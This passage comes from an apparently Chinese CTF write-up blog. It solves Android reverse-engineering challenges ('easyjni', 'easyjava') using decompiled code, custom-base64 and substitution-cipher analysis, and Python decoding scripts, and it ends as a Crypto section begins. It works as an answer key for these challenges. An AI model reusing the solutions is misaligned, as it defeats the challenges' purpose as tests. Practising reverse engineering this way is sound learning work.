class="number">109</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">72</span>, <span class="number">67</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">112</span>, <span class="number">69</span>, <span class="number">97</span>, <span class="number">74</span>, <span class="number">82</span>, <span class="number">90</span>, <span class="number">78</span> &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(<span class="keyword">byte</span>[] paramArrayOfByte)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    StringBuilder localStringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= paramArrayOfByte.length - <span class="number">1</span>; i += <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (j &lt;= <span class="number">2</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (i + j &lt;= paramArrayOfByte.length - <span class="number">1</span>) &#123;</span><br><span class="line">          arrayOfByte[j] = ((<span class="keyword">byte</span>)(<span class="keyword">byte</span>)(k | (paramArrayOfByte[(i + j)] &amp; <span class="number">0xFF</span>) &gt;&gt;&gt; j * <span class="number">2</span> + <span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (k = (<span class="keyword">byte</span>)(((paramArrayOfByte[(i + j)] &amp; <span class="number">0xFF</span>) &lt;&lt; (<span class="number">2</span> - j) * <span class="number">2</span> + <span class="number">2</span> &amp; <span class="number">0xFF</span>) &gt;&gt;&gt; <span class="number">2</span>);; k = <span class="number">64</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          j++;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">          arrayOfByte[j] = ((<span class="keyword">byte</span>)k);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      arrayOfByte[<span class="number">3</span>] = ((<span class="keyword">byte</span>)k);</span><br><span class="line">      k = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (k &lt;= <span class="number">3</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (arrayOfByte[k] &lt;= <span class="number">63</span>) &#123;</span><br><span class="line">          localStringBuilder.append(a[arrayOfByte[k]]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">          k++;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">          localStringBuilder.append(<span class="string">&#x27;=&#x27;</span>);<span class="comment">//base</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> localStringBuilder.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每一个字符都进行一次加密，每轮加密都会有 &amp; 、&gt;&gt; 操作，且最后会加上 == ，推断是 base 加密。然后根据密码表 a 判断是自定义密码表的 base 加密方式。</p>
<p>第一次加密完成后的返回值作为 ncheck 的参数，这是一个加载的 so 中的函数：<code>System.loadLibrary(&quot;native&quot;);</code>。分析这个函数需要到 so 文件里面，so 文件在 lib/armeabi-v7a/libnative.so 。</p>
<p>进入到 ncheck 函数后，再进行两次加密，分别是：前 16 位与后 16 位互换；前 1 位与后 1 位互换：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __fastcall <span class="title">Java_com_a_easyjni_MainActivity_ncheck</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">…………</span><br><span class="line">  v6 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, a3, <span class="number">0</span>);<span class="comment">// 字符串传递给a1，a1指针取值到v6</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v6) == <span class="number">32</span> )                       <span class="comment">// base加密长度限制32位</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = &amp;s1[v7];                             <span class="comment">// s1[0]指针给v8</span></span><br><span class="line">      s1[v7] = v6[v7 + <span class="number">16</span>];                     <span class="comment">// s1[0]=v6[16]</span></span><br><span class="line">      v9 = v6[v7++];</span><br><span class="line">      v8[<span class="number">16</span>] = v9;                              <span class="comment">// s1[0+16]=v6[0]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 != <span class="number">16</span> );                         <span class="comment">// 循环16次，每次操作两个数</span></span><br><span class="line">                                                <span class="comment">// 相当于将前16位于后16位对调</span></span><br><span class="line">    (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> *))(*(_DWORD *)v4 + <span class="number">680</span>))(v4, v5, v6);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v12 = __OFSUB__(v10, <span class="number">30</span>);</span><br><span class="line">      v11 = v10 - <span class="number">30</span> &lt; <span class="number">0</span>;</span><br><span class="line">      v16 = s1[v10];</span><br><span class="line">      s1[v10] = s1[v10 + <span class="number">1</span>];                    <span class="comment">// s1[0]=s1[1]</span></span><br><span class="line">      s1[v10 + <span class="number">1</span>] = v16;                        <span class="comment">// s1[1]=s1[0]</span></span><br><span class="line">      v10 += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 ^ v12 );                        <span class="comment">// 相当于前一位与后一位对调位置</span></span><br><span class="line">    v13 = <span class="built_in">memcmp</span>(s1, <span class="string">&quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;</span>, <span class="number">0x20</span>u);<span class="comment">//与密文比较</span></span><br><span class="line">…………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>首先将密文：<code>MbT3sQgX039i3g==AQOoMQFPskB1Bsc7</code> 还原：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#手动完成前后 16 位互换</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">&quot;AQOoMQFPskB1Bsc7MbT3sQgX039i3g==&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">2</span>):</span><br><span class="line">	v9 = c[i]</span><br><span class="line">	c[i] = c[i+<span class="number">1</span>]</span><br><span class="line">	c[i+<span class="number">1</span>] = v9</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">print(<span class="string">&quot;flag:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line"><span class="comment">#flag:QAoOQMPFks1BsB7cbM3TQsXg30i9g3==</span></span><br></pre></td></tr></table></figure>

<p>然后实现自定义密码表 base 解码，我找到的一个脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义加密表</span></span><br><span class="line"><span class="comment">#s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;#原版</span></span><br><span class="line">s = <span class="string">&quot;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&quot;</span><span class="comment">#自定义</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_encode</span>(<span class="params">inputs</span>):</span></span><br><span class="line">	<span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">	bin_str = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line">		x = <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">ord</span>(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		bin_str.append(<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">	<span class="comment">#print(bin_str)</span></span><br><span class="line">	<span class="comment"># 输出的字符串</span></span><br><span class="line">	outputs = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="comment"># 不够三倍数，需补齐的次数</span></span><br><span class="line">	nums = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> bin_str:</span><br><span class="line">		<span class="comment">#每次取三个字符的二进制</span></span><br><span class="line">		temp_list = bin_str[:<span class="number">3</span>]</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">len</span>(temp_list) != <span class="number">3</span>):</span><br><span class="line">			nums = <span class="number">3</span> - <span class="built_in">len</span>(temp_list)</span><br><span class="line">			<span class="keyword">while</span> <span class="built_in">len</span>(temp_list) &lt; <span class="number">3</span>:</span><br><span class="line">				temp_list += [<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>]</span><br><span class="line">		temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line">		<span class="comment">#print(temp_str)</span></span><br><span class="line">		<span class="comment"># 将三个8字节的二进制转换为4个十进制</span></span><br><span class="line">		temp_str_list = []</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">			temp_str_list.append(<span class="built_in">int</span>(temp_str[i*<span class="number">6</span>:(i+<span class="number">1</span>)*<span class="number">6</span>],<span class="number">2</span>))</span><br><span class="line">		<span class="comment">#print(temp_str_list)</span></span><br><span class="line">		<span class="keyword">if</span> nums:</span><br><span class="line">			temp_str_list = temp_str_list[<span class="number">0</span>:<span class="number">4</span> - nums]</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> temp_str_list:</span><br><span class="line">			outputs += s[i]</span><br><span class="line">		bin_str = bin_str[<span class="number">3</span>:]</span><br><span class="line">	outputs += nums * <span class="string">&#x27;=&#x27;</span></span><br><span class="line">	print(<span class="string">&quot;Encrypted String:\n%s &quot;</span>%outputs)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_decode</span>(<span class="params">inputs</span>):</span></span><br><span class="line">	<span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">	bin_str = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line">		<span class="keyword">if</span> i != <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">			x = <span class="built_in">str</span>(<span class="built_in">bin</span>(s.index(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">			bin_str.append(<span class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">	<span class="comment">#print(bin_str)</span></span><br><span class="line">	<span class="comment"># 输出的字符串</span></span><br><span class="line">	outputs = <span class="string">&quot;&quot;</span></span><br><span class="line">	nums = inputs.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">	<span class="keyword">while</span> bin_str:</span><br><span class="line">		temp_list = bin_str[:<span class="number">4</span>]</span><br><span class="line">		temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line">		<span class="comment">#print(temp_str)</span></span><br><span class="line">		<span class="comment"># 补足8位字节</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">len</span>(temp_str) % <span class="number">8</span> != <span class="number">0</span>):</span><br><span class="line">			temp_str = temp_str[<span class="number">0</span>:-<span class="number">1</span> * nums * <span class="number">2</span>]</span><br><span class="line">		<span class="comment"># 将四个6字节的二进制转换为三个字符</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">int</span>(<span class="built_in">len</span>(temp_str) / <span class="number">8</span>)):</span><br><span class="line">			outputs += <span class="built_in">chr</span>(<span class="built_in">int</span>(temp_str[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">		bin_str = bin_str[<span class="number">4</span>:]	</span><br><span class="line">	print(<span class="string">&quot;Decrypted String:\n%s &quot;</span>%outputs)</span><br><span class="line">	</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">&quot;     *************************************&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;     *    (1)encode         (2)decode    *&quot;</span>)	</span><br><span class="line">print(<span class="string">&quot;     *************************************&quot;</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = <span class="built_in">input</span>(<span class="string">&quot;Please select the operation you want to perform:\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(num == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">	input_str = <span class="built_in">input</span>(<span class="string">&quot;Please enter a string that needs to be encrypted: \n&quot;</span>)</span><br><span class="line">	My_base64_encode(input_str)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	input_str = <span class="built_in">input</span>(<span class="string">&quot;Please enter a string that needs to be decrypted: \n&quot;</span>)</span><br><span class="line">	My_base64_decode(input_str)</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     *************************************</span><br><span class="line">     *    (1)encode         (2)decode    *</span><br><span class="line">     *************************************</span><br><span class="line"></span><br><span class="line">Please select the operation you want to perform:</span><br><span class="line">2</span><br><span class="line">Please enter a string that needs to be decrypted:</span><br><span class="line">QAoOQMPFks1BsB7cbM3TQsXg30i9g3==</span><br><span class="line">Decrypted String:</span><br><span class="line">flag&#123;实践出真知这不是flag&#125;</span><br></pre></td></tr></table></figure>

<h3 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h3><p>[collapse title=”展开查看详情” status=”false”]</p>
<p><strong>考点：手撕算法</strong></p>
<blockquote>
<p>部分函数名已重命名，懒得再找一份原题QAQ</p>
</blockquote>
<p>开门见山，mainactivity 就能找到加密算法入口。函数将输入值剔除<code>flag&#123;&#125;</code> ，然后传入加密函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Boolean <span class="title">b</span><span class="params">(String string)</span> </span>&#123;  <span class="comment">// 结尾&#125;</span></span><br><span class="line">    Boolean result;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!string.startsWith(<span class="string">&quot;flag&#123;&quot;</span>)) &#123;  <span class="comment">// 开头flag&#123;</span></span><br><span class="line">        result = Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!string.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">        result = Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        String string_1 = string.substring(<span class="number">5</span>, string.length() - <span class="number">1</span>);  <span class="comment">// 分割字符串去除flag&#123;&#125;</span></span><br><span class="line">        Mb v4 = <span class="keyword">new</span> Mb(Integer.valueOf(<span class="number">2</span>));</span><br><span class="line">        Ma v5 = <span class="keyword">new</span> Ma(Integer.valueOf(<span class="number">3</span>));</span><br><span class="line">        StringBuilder c_string = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(index &lt; string_1.length()) &#123;</span><br><span class="line">            c_string.append(MainActivity.a(string_1.charAt(index) + <span class="string">&quot;&quot;</span>, v4, v5));	<span class="comment">//加密函数</span></span><br><span class="line">            Integer v6 = Integer.valueOf(v4.b().intValue() / <span class="number">25</span>);</span><br><span class="line">            <span class="keyword">if</span>(v6.intValue() &gt; v1 &amp;&amp; v6.intValue() &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">                ++v1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++index;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result = Boolean.valueOf(c_string.toString().equals(<span class="string">&quot;wigwrkaugala&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加密函数有两层最后调用为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">a</span><span class="params">(String string, Mb b, Ma a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.a(b.a(string));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>a b 加密逻辑大致一样，处理对象都是单字符，进行混淆后，对密钥进行更新。</p>
<p>b 加密函数主要如下：（忽略处理空格和字符不存在情况）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Mb.key_list = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">a</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0 = <span class="number">0</span>;</span><br><span class="line">    Integer v1 = Integer.valueOf(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(Mb.key_list.contains(string.toLowerCase())) &#123;  <span class="comment">// 转为小写，然后查询在不在key中</span></span><br><span class="line">        Integer index = Integer.valueOf(Mb.key_list.indexOf(string));</span><br><span class="line">        <span class="keyword">while</span>(v0 &lt; Mb.a_ArrayList.size() - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(Mb.a_ArrayList.get(v0) == index) &#123;</span><br><span class="line">                v1 = Integer.valueOf(v0);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++v0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">…………</span><br><span class="line">	Mb.a();</span><br><span class="line">	<span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加密操作为：检索字符在<code>keylisit</code>的下标，记为<code>index</code>，然后检索<code>index</code>在<code>a_ArrayList</code>的下标，记为<code>v1</code>，检索成功就调用<code>Mb.a()</code>生成新的密钥<code>keylist</code>和<code>a_ArrayList</code>，然后返回<code>v1</code>。</p>
<p><code>a_ArrayList</code>不是一个静态变量，是经由<code>public Mb(Integer arg9)</code>生成的，一开始以为动态生成的，然后动态调试了一下，发现是第一次调用时生成好了，后续字符加密沿用上一字符密钥。生成的偏移为 2 。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-04-28-18PsopqjCVDDdny8.png"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-04-28-cyfmgGJeWshDBKLi.png"></p>
<p><code>Mb.a()</code>处理逻辑就是：每一轮加密完成后，将两个密钥的首元素放置到最后一位。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0 = Mb.a_ArrayList.get(<span class="number">0</span>).intValue();</span><br><span class="line">    Mb.a_ArrayList.remove(<span class="number">0</span>);</span><br><span class="line">    Mb.a_ArrayList.add(Integer.valueOf(v0));  <span class="comment">// 将列表首个元素放到最后</span></span><br><span class="line">    Mb.key_list = Mb.key_list + <span class="string">&quot;&quot;</span> + Mb.key_list.charAt(<span class="number">0</span>);</span><br><span class="line">    Mb.key_list = Mb.key_list.substring(<span class="number">1</span>, <span class="number">27</span>);  <span class="comment">// 将列表首个元素放到最后</span></span><br><span class="line">    Mb.d = Integer.valueOf(Mb.d.intValue() + <span class="number">1</span>);  <span class="comment">// 某个计算位加1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>a.a(b.a(string))</code> b 函数加密完成后，返回值作为参数传入 a ，加密方式与 b 相近，较大不同点是每轮加密不会随机化密钥，密钥初始偏移为 3 。因为从最后判断函数可知 flag 中间字符为 12 位，不足以触发 a 随机化密钥函数要求。</p>
<p>解密EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque <span class="comment"># 双端队列简化随机密钥实现</span></span><br><span class="line">alpha = deque(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>) </span><br><span class="line"><span class="comment">#key_b = deque([8, 25, 17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13]) </span></span><br><span class="line"><span class="comment">#key_a = deque([7, 14, 16, 21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8])</span></span><br><span class="line">key_b = deque([<span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">25</span>])</span><br><span class="line">key_a = deque([<span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">16</span>])</span><br><span class="line">c = <span class="string">&#x27;wigwrkaugala&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span> </span><br><span class="line">    i = key_a[(<span class="built_in">ord</span>(s) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))]</span><br><span class="line">    i = key_b[(i)] </span><br><span class="line">    print(alpha[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    key_b.append(key_b.popleft()) </span><br><span class="line">    alpha.append(alpha.popleft())</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> c: decode(s)</span><br><span class="line">print(<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>提交 flag 后看评论区好像题目有多解。</p>
</blockquote>
<p>[/collapse]</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h3><p>[collapse title=”展开查看详情” status=”false”]</p>
<p>给出文本：<code>8842101220480224404014224202480122</code>。查看资料后，得出 0 是分解符。分界后各个数字相加后 -1 为与 A 的 ascii 码偏移。（ps：怎么感觉有点像是 8421 码）</p>
